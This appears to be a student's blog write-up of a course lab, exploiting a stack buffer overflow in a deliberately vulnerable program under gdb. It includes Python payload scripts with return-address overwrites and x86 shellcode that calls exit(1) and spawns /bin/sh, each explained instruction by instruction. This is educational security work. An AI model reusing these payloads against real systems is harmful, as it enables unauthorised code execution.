+++
title = 'Machine Problem 1'
date = 2024-02-22T20:20:00+08:00
draft = false
background_image = "/images/hackerman.jpg"
+++


## TL;DR
- `eip` upon entering `vuln()` is `0x56556183`
- we break at `0x56556191` (`ret` from `vuln`) to observe behavior of `eip`
- following the suggested information-giving commands in `gdb`, we get the desirable `esp` in vuln being `0xffffcde8`
	- we confirm this by defining `hook-stop` with `x/1i $eip` and `x/16wx $esp` which allows us to view the current instruction and the next 16 words in the stack every time execution is stopped
- we try to craft the shell code
- compiling the given `asm` with necessary incantations fails
- we look for an exit one shell code in shell-storm
- we find that it has the exact same codes in as the ones already in the `mp1.pdf`
- we finally craft shell code
	- `\x41 * 12` for padding
	- `\xe8\xcd\xff\xff` redirecting our `eip`
	- `\x31\xc0\x40\x89\xc3\xcd\x80` exit one shell code
- we analyze exactly what the machine code does because we’re not script kiddies
- we try running `/bin/bash` with an `execve("/bin/bash")` shell code (ofc from shell-storm)
- \$\$\$ profit

exit one shell code full:
``` python
import struct

# we want to write past the sfp and change rip
padding = b"A" * 12
ret_address = 0xffffcdf8
redirect = struct.pack("<I", ret_address)
exit_one = b"\x31\xc0\x40\x89\xc3\xcd\x80" 

payload = padding + redirect + exit_one

with open("payload", "wb") as f:
	f.write(payload)
```


## Know thy enemy

After compiling `vuln.c` with the necessary incantations, load its symbols into `gdb` with `gdb -q vuln`, and following through with the preliminary magicks required to peer into the heart of the code, most especially with `info frame`, we figure out that our `eip` has been yeeted into `0x56556183`, the current `esp` is at `0xffffcdf8`, and the current `ebp` is at `0xffffcdf0`. We also know from `print &buffer` that it is stored at the location `0xffffcde8`, showing that the stack has allocated 8 bytes for `char buffer`. This will be important in our stack smashing endeavor.

{{< figure src="infoframe.png" title="info_frame.png" width="600" class="centered" >}}

Lets take a deeper look at the `vuln()` by disassembling it with `disassemble vuln` in `gdb`:

{{< figure src="disasvuln.png" title="disasvuln.png" width="500" class="centered" >}}

I assume that the arrow points towards where we set `break 1`, which is at the declaration of `char buffer[8]`.  

We want to change where our function returns, so lets take a look at what stored in `0x56556191` by setting a break point at that address (`break *0x56556191`). To gain more insight however, we need to look at our beginner’s book of spell analysis, famously called “[*The Documentation*](https://ftp.gnu.org/old-gnu/Manuals/gdb/html_chapter/gdb_toc.html)”.

We have gleaned information from our guide that `x/1i $eip` allows us to print out the value of `eip` (what will be executed next), and lets also take a look at our stack with `x/16wx`, allowing us to see the next 18 words from where we currently are in the stack.

A quick look at our guide tells us that we can automate this with a `hook`, which can be executed at certain points when running the program. `hook-stop` is particularly of interest, since it automatically executes whenever our program stops running in `gdb`, like hitting breakpoints. So here is what we’ve done so far:

``` bash
(gdb) b *0x56556191
(gdb) define hook-stop
>x/1i $eip
>x/16wx $esp
end
```
Now we run the program again from the beginning, prompting us with the `gets()` function and for now we enter `ASD`. Our program stops at the return address, promptly showing the value of `eip` and the next 16 words in our stack. 

{{< figure src="hookstop.png" title="hookstop.png" width="700" class="centered" >}}

Going a single step with `si` shows us a jump from `0x56556191`  to `0x5655619a`, which is our `while(1){}` loop: 

{{< figure src="jumptowhile.png" title="jumptowhile.png" width="700" class="centered" >}}

While it doesn’t seem useful now, it is once we have crafted our payload. Speaking of which, lets do just that:

## My Kung Fu is stronger than yours
> Your security technique will be defeated! - Zeke Shif, December 25 1994

Lets sum up what we know:
- `buffer`’s last byte is at `0xffffcde8`
- `vuln()`’s stack frame base pointer (`ebp`) is at `0xffffcdf0`
- the `esp` for the current frame `0xffffcdf8`

The plan is to overflow `buffer`, write whatever into `sfp` and change `rip` to `esp`, so we `eip` pops that value and continues execution from there. Lets test that hypothesis  by creating our machine code payload. I really don’t wanna recite the *ancient rites of assembly incantations*, so lets just use our *Parseltongue* and summon the will of the snake (`python 3.11`):

``` python
import struct

# we want to write past the sfp and change rip
padding = b"A" * 12
ret_address = 0xffffcdf8
redirect = struct.pack("<I", ret_address)

payload = padding + redirect

with open("payload", "wb") as f:
	f.write(payload)
```

And voila, we have written machine code payload into a file called `payload`. How very developer-like to name things the same thing. Anyway, `struct.pack` gives us a `bytes` type object in a certain format – which is `"<I"` which is a little-endian byte order.

Does that actually work? Lets find out (Haha did you get it? No? Okay, it was a stupid reference anyway):

Lets load the `payload` into `vuln` with the command `r < payload` and run the whole thing from the beginning. In theory, it should ***penetrate*** our stack so **deep** it **fills up** the `rip` with *something* (`0xffffcdf8`):

{{< figure src="filluprip.png" title="filluprip.png" width="700" class="centered" >}}

This is our `ret` breakpoint, lets go one step from here with `si`:

{{< figure src="singlestep.png" title="singlestep.png" width="700" class="centered" >}}

We did manage to ***penetrate and fill up*** our `rip` and control execution, but we’re missing one crucial thing for our payload. The shell code for `exit(1)`! Anyway, lets continue our current run first for educational purposes.

{{< figure src="redir.png" title="redir.png" width="700" class="centered" >}}

So it gives us a `SIGILL`, probably because its doing something sinister, i dunno. Apparently the CPU dunno too so it just gives `SIGILL`. Anyway, lets do the shell code now. I tried just copying the assembly incantation from `mp1.pdf` but it doesn’t work for me, idk. 

{{< figure src="asm.png" title="asm.png" width="400" class="centered" >}}
{{< figure src="failure.png" title="failure.png" width="600" class="centered" >}}

So lets copy it from [somewhere online](https://shell-storm.org/shellcode/files/shellcode-55.html). Thank you, Charles Stevenson!

```c
/* exit-core.c by Charles Stevenson < core@bokeoa.com >  
 *
 * I made this as a chunk you can paste in to make modular remote
 * exploits.  I use it when I need a process to exit cleanly.
 */
char hellcode[] = /*  _exit(1); linux/x86 by core */
// 7 bytes _exit(1) ... 'cause we're nice >:) by core
"\x31\xc0"              // xor  %eax,%eax
"\x40"                  // inc  %eax
"\x89\xc3"              // mov  %eax,%ebx
"\xcd\x80"              // int  $0x80
;

int main(void)
{
  void (*shell)() = (void *)&hellcode;
  printf("%d byte _exit(1); linux/x86 by core\n",
         strlen(hellcode));
  shell();
  return 0;
}

```

We can just copy the machine code directly and plug it into our payload

``` python
import struct

# we want to write past the sfp and change rip
padding = b"A" * 12
ret_address = 0xffffcdf8
redirect = struct.pack("<I", ret_address)
exit_one = b"\x31\xc0\x40\x89\xc3\xcd\x80" 

payload = padding + redirect + exit_one

with open("payload", "wb") as f:
	f.write(payload)
```

Now lets regenerate payload with `python payload.py` and rerun `vuln` in `gdb


{{< figure src="payload.png" title="payload.png" width="600" class="centered" >}}

And just like that, we can see the shell code being executed in (little-endian) order in the stack. However, let’s not be *script kiddies* and actually analyze what it does:

```asm
118a: 31 c0 xor %eax,%eax ; set eax to 0
118c: 40 inc %eax         ; incremenet eax by 1
118d: 89 c3 mov %eax,%ebx ; move eax into ebx (now ebx = 1)
118f: cd 80 int $0x80     ; trigger interrupt, invoke syscall (eax)
```

Okay, I know I put comments, but just to make it clearer:
- `\x31\xc0`: XORs the `eax` register with itself, effectively setting `eax` to 0.
- `\x40`: Increments `eax` by 1, so `eax` becomes 1.
- `\x89\xc3` passes exit code (`ebx=1`) to the `exit` syscall 
- `\xcd\x80`: Triggers an interrupt `0x80`, which is the Linux syscall interrupt. The value in `eax` determines which syscall to invoke. In this case, `eax` is set to 1 (the `exit` syscall number), so it invokes the `exit` syscall.

## Why stop there?

I mean we’re already here, lets run bash. We can do this with the `execve` command, with the input being `"/bin/sh"`. However, I really don’t wanna reinvent the wheel and make my own shell code from with assembly, so I’m gonna stand on the [*shoulder of giants*](https://shell-storm.org/shellcode/files/shellcode-811.html) (most especially, the giant named **Jean Pascal Pereira**. Whoever you are, thanks!):

This assembly code is from the shell-storm link I carefully placed above:

```asm
31 c0                 xor    %eax,%eax          ; Clear eax register (set it to 0)
50                    push   %eax               ; Push null byte onto the stack (used as a terminator)
68 2f 2f 73 68        push   $0x68732f2f        ; Push the string "//sh" onto the stack in reverse order
68 2f 62 69 6e        push   $0x6e69622f        ; Push the string "nib/" onto the stack in reverse order
89 e3                 mov    %esp,%ebx          ; Move the address of the top of the stack (which now contains the "/bin/sh" string) into ebx
89 c1                 mov    %eax,%ecx          ; Move 0 (null) into ecx (will be used as the second argument to execve, argv)
89 c2                 mov    %eax,%edx          ; Move 0 (null) into edx (will be used as the third argument to execve, envp)
b0 0b                 mov    $0xb,%al           ; Move the syscall number for execve (11) into al
cd 80                 int    $0x80              ; Invoke the syscall (execve("/bin/sh", 0, 0))
31 c0                 xor    %eax,%eax          ; Clear eax register (set it to 0)
40                    inc    %eax               ; Increment eax (set it to 1, which is the syscall exit number)
cd 80                 int    $0x80              ; Invoke the syscall (exit)
```

As usual, we analyze the assembly code to *not become script kiddies*. Now its just a matter of inserting the machine code in our python script, (we’re keeping the `exit_one` code though):

``` python
import struct

# we want to write past the sfp and change rip
padding = b"A" * 12
ret_address = 0xffffcdf8
redirect = struct.pack("<I", ret_address)
exit_one = b"\x31\xc0\x40\x89\xc3\xcd\x80" 
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

payload = padding + redirect + shellcode

with open("payload", "wb") as f:
	f.write(payload)
```

Now lets rerun the entire thing:

{{< figure src="bash.png" title="bash.png" width="600" class="centered" >}}

As we can see, we successfully executed a new program, `/usr/bin/bash`. A slight problem is that I cannot really execute this outside of gdb - it is due to Linux ASLR and probably memory padding, but that’s most likely outside the scope of this machine problem.
